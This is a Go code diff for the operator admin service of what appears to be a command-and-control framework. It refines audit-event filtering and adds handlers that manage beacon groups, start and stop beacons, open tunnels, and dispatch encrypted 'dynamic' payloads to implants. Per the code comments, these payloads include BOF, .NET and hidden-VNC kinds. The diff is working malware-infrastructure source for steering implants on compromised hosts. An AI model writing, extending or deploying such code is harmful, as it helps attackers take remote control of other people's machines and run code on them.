@@ -12,6 +12,7 @@ import (
 	"github.com/uLl0a/lavianc2/internal/events"
 	"github.com/uLl0a/lavianc2/internal/models"
 	"github.com/uLl0a/lavianc2/internal/profiles"
+	"github.com/uLl0a/lavianc2/internal/beacons"
 	"github.com/uLl0a/lavianc2/internal/storage"
 	"github.com/uLl0a/lavianc2/internal/tasks"
 	"golang.org/x/crypto/bcrypt"
@@ -30,6 +31,7 @@ type adminService struct {
 	dnsProfiles  *profiles.DNSRegistry
 	quicProfiles *profiles.QUICRegistry
 	serverKeys   *crypto.ServerKeyStore
+	beaconMgr    *beacons.Manager
 	repoRoot     string
 	caFile       string
 }
@@ -42,6 +44,7 @@ func NewAdminService(
 	dnsProfiles *profiles.DNSRegistry,
 	quicProfiles *profiles.QUICRegistry,
 	serverKeys *crypto.ServerKeyStore,
+	beaconMgr *beacons.Manager,
 	repoRoot string,
 	caFile string,
 ) *adminService {
@@ -53,6 +56,7 @@ func NewAdminService(
 		dnsProfiles:  dnsProfiles,
 		quicProfiles: quicProfiles,
 		serverKeys:   serverKeys,
+		beaconMgr:    beaconMgr,
 		repoRoot:     repoRoot,
 		caFile:       caFile,
 	}
@@ -247,28 +251,46 @@ func (s *adminService) StreamTaskEvents(req *adminv1.StreamTaskEventsRequest, st
 func (s *adminService) StreamAudit(req *adminv1.StreamAuditRequest, stream adminv1.AdminService_StreamAuditServer) error {
 	wantCategory := req.Category
 
-	eventsCh := make(chan *adminv1.AuditEvent, 128)
-
-	topics := []events.Topic{
-		events.TopicOperatorAction,
-		events.TopicImplantCheckin,
-		events.TopicImplantDead,
-		events.TopicTaskCreated,
-		events.TopicTaskCompleted,
-		events.TopicListenerEvent,
+	// categoryToTopics resuelve la categoría del request a los topics del
+	// bus que le corresponden. La categoría coincide con el prefijo del
+	// topic ("task" → task.created + task.completed), y "auth" es un
+	// alias de "operator".
+	categoryToTopics := func(cat string) []events.Topic {
+		all := []events.Topic{
+			events.TopicOperatorAction,
+			events.TopicImplantCheckin,
+			events.TopicImplantDead,
+			events.TopicTaskCreated,
+			events.TopicTaskCompleted,
+			events.TopicListenerEvent,
+		}
+		if cat == "" {
+			return all
+		}
+		if cat == "auth" {
+			cat = "operator"
+		}
+		var out []events.Topic
+		for _, t := range all {
+			if strings.HasPrefix(string(t), cat) {
+				out = append(out, t)
+			}
+		}
+		return out
 	}
+
+	topics := categoryToTopics(wantCategory)
+	if len(topics) == 0 {
+		return status.Errorf(codes.InvalidArgument,
+			"categoría %q no reconocida (usar: operator|auth, implant, task, listener, o vacío para todas)", wantCategory)
+	}
+
+	eventsCh := make(chan *adminv1.AuditEvent, 128)
 
 	unsubs := make([]func(), 0, len(topics))
 	for _, topic := range topics {
 		topic := topic // captura por valor para la clausura
 		unsub := s.bus.Subscribe(topic, func(ctx context.Context, ev events.Event) {
-			if wantCategory != "" {
-				topicStr := string(ev.Topic)
-				if !strings.HasPrefix(topicStr, wantCategory) {
-					return
-				}
-			}
-
 			select {
 			case eventsCh <- &adminv1.AuditEvent{
 				Level:    "info",
@@ -348,6 +370,194 @@ func (s *adminService) ListQUICProfiles(ctx context.Context, _ *emptypb.Empty) (
 		})
 	}
 	return resp, nil
+}
+
+// ── Multi-Beacon Manager handlers ──────────────────────────────────────
+
+func beaconToProto(b *beacons.Beacon) *adminv1.Beacon {
+	pb := &adminv1.Beacon{
+		Id:         b.ID.String(),
+		Name:       b.Name,
+		Profile:    string(b.Profile),
+		State:      string(b.State),
+		FailStreak: int32(b.FailStreak),
+		MaxFails:   int32(b.MaxFails),
+	}
+	if b.GroupID != nil {
+		pb.GroupId = b.GroupID.String()
+	}
+	if !b.LastCheckIn.IsZero() {
+		pb.LastCheckIn = timestamppb.New(b.LastCheckIn)
+	}
+	return pb
+}
+
+func (s *adminService) CreateBeaconGroup(ctx context.Context, req *adminv1.CreateBeaconGroupRequest) (*adminv1.BeaconGroup, error) {
+	g, err := s.beaconMgr.Registry.CreateGroup(ctx, req.Name, req.Profile)
+	if err != nil {
+		return nil, status.Errorf(codes.InvalidArgument, "crear grupo: %v", err)
+	}
+	return &adminv1.BeaconGroup{
+		Id:      g.ID.String(),
+		Name:    g.Name,
+		Profile: string(g.Profile),
+	}, nil
+}
+
+func (s *adminService) ListBeaconGroups(ctx context.Context, _ *emptypb.Empty) (*adminv1.ListBeaconGroupsResponse, error) {
+	groups, err := s.beaconMgr.Registry.ListGroups(ctx)
+	if err != nil {
+		return nil, status.Errorf(codes.Internal, "listar grupos: %v", err)
+	}
+	resp := &adminv1.ListBeaconGroupsResponse{}
+	for _, g := range groups {
+		resp.Groups = append(resp.Groups, &adminv1.BeaconGroup{
+			Id:      g.ID.String(),
+			Name:    g.Name,
+			Profile: string(g.Profile),
+		})
+	}
+	return resp, nil
+}
+
+func (s *adminService) RegisterBeacon(ctx context.Context, req *adminv1.RegisterBeaconRequest) (*adminv1.Beacon, error) {
+	var groupID *uuid.UUID
+	if req.GroupId != "" {
+		gid, err := uuid.Parse(req.GroupId)
+		if err != nil {
+			return nil, status.Error(codes.InvalidArgument, "group_id inválido")
+		}
+		groupID = &gid
+	}
+	b, err := s.beaconMgr.RegisterBeacon(ctx, req.Name, req.Profile, groupID)
+	if err != nil {
+		return nil, status.Errorf(codes.InvalidArgument, "registrar beacon: %v", err)
+	}
+	return beaconToProto(b), nil
+}
+
+func (s *adminService) GetBeacon(ctx context.Context, req *adminv1.GetBeaconRequest) (*adminv1.Beacon, error) {
+	id, err := uuid.Parse(req.Id)
+	if err != nil {
+		return nil, status.Error(codes.InvalidArgument, "id inválido")
+	}
+	b, ok := s.beaconMgr.Registry.Get(id)
+	if !ok {
+		return nil, status.Error(codes.NotFound, "beacon no encontrado")
+	}
+	if f, ok := s.beaconMgr.Registry.FSM(id); ok {
+		b.State = f.State()
+		b.FailStreak = f.FailStreak()
+	}
+	return beaconToProto(b), nil
+}
+
+func (s *adminService) ListBeacons(ctx context.Context, _ *emptypb.Empty) (*adminv1.ListBeaconsResponse, error) {
+	resp := &adminv1.ListBeaconsResponse{}
+	for _, b := range s.beaconMgr.Registry.List() {
+		if f, ok := s.beaconMgr.Registry.FSM(b.ID); ok {
+			b.State = f.State()
+			b.FailStreak = f.FailStreak()
+		}
+		resp.Beacons = append(resp.Beacons, beaconToProto(b))
+	}
+	return resp, nil
+}
+
+func (s *adminService) SetBeaconProfile(ctx context.Context, req *adminv1.SetBeaconProfileRequest) (*adminv1.Beacon, error) {
+	id, err := uuid.Parse(req.Id)
+	if err != nil {
+		return nil, status.Error(codes.InvalidArgument, "id inválido")
+	}
+	profile, err := beacons.ParseProfile(req.Profile)
+	if err != nil {
+		return nil, status.Errorf(codes.InvalidArgument, "perfil: %v", err)
+	}
+	if err := s.beaconMgr.Registry.SetProfile(ctx, id, profile); err != nil {
+		return nil, status.Errorf(codes.NotFound, "%v", err)
+	}
+	b, _ := s.beaconMgr.Registry.Get(id)
+	return beaconToProto(b), nil
+}
+
+func (s *adminService) StartBeacon(ctx context.Context, req *adminv1.BeaconControlRequest) (*emptypb.Empty, error) {
+	id, err := uuid.Parse(req.Id)
+	if err != nil {
+		return nil, status.Error(codes.InvalidArgument, "id inválido")
+	}
+	if err := s.beaconMgr.StartBeacon(id); err != nil {
+		return nil, status.Errorf(codes.NotFound, "%v", err)
+	}
+	return &emptypb.Empty{}, nil
+}
+
+func (s *adminService) StopBeacon(ctx context.Context, req *adminv1.BeaconControlRequest) (*emptypb.Empty, error) {
+	id, err := uuid.Parse(req.Id)
+	if err != nil {
+		return nil, status.Error(codes.InvalidArgument, "id inválido")
+	}
+	if err := s.beaconMgr.StopBeacon(id); err != nil {
+		return nil, status.Errorf(codes.NotFound, "%v", err)
+	}
+	return &emptypb.Empty{}, nil
+}
+
+func (s *adminService) SubmitDynamicPayload(ctx context.Context, req *adminv1.SubmitDynamicPayloadRequest) (*emptypb.Empty, error) {
+	id, err := uuid.Parse(req.BeaconId)
+	if err != nil {
+		return nil, status.Error(codes.InvalidArgument, "beacon_id inválido")
+	}
+	kind, err := beacons.ParsePayloadKind(req.Kind)
+	if err != nil {
+		return nil, status.Errorf(codes.InvalidArgument, "kind: %v", err)
+	}
+	// Validación de política: solo short-haul acepta BOF/.NET/hVNC.
+	if err := s.beaconMgr.Assign(id, kind); err != nil {
+		return nil, status.Errorf(codes.FailedPrecondition, "%v", err)
+	}
+
+	// Resolver el implant asociado al beacon para despachar la tarea.
+	implantID := s.beaconMgr.Registry.ImplantOf(id)
+	if implantID == nil {
+		return nil, status.Error(codes.FailedPrecondition,
+			"beacon sin implant asociado: no se puede despachar (regístralo o haz que haga check-in primero)")
+	}
+
+	// Persistir el payload y encolar la tarea `dynamic`. El payload viaja
+	// cifrado al implant en el campo Payload de TaskWire (ya soportado).
+	opID := operatorIDFromContext(ctx)
+	t := &models.Task{
+		ID:         uuid.New(),
+		ImplantID:  *implantID,
+		OperatorID: opID,
+		Command:    "dynamic",
+		Args:       []string{string(kind)},
+		Payload:    req.Data,
+	}
+	if err := s.engine.Submit(ctx, t); err != nil {
+		return nil, status.Errorf(codes.Internal, "encolar payload dinámico: %v", err)
+	}
+	return &emptypb.Empty{}, nil
+}
+
+func (s *adminService) OpenTunnel(ctx context.Context, req *adminv1.BeaconControlRequest) (*emptypb.Empty, error) {
+	id, err := uuid.Parse(req.Id)
+	if err != nil {
+		return nil, status.Error(codes.InvalidArgument, "id inválido")
+	}
+	if err := s.beaconMgr.OpenTunnel(id); err != nil {
+		return nil, status.Errorf(codes.FailedPrecondition, "%v", err)
+	}
+	return &emptypb.Empty{}, nil
+}
+
+func (s *adminService) CloseTunnel(ctx context.Context, req *adminv1.BeaconControlRequest) (*emptypb.Empty, error) {
+	id, err := uuid.Parse(req.Id)
+	if err != nil {
+		return nil, status.Error(codes.InvalidArgument, "id inválido")
+	}
+	s.beaconMgr.CloseTunnel(id)
+	return &emptypb.Empty{}, nil
 }
 
 func operatorToProto(op *models.Operator) *adminv1.Operator {
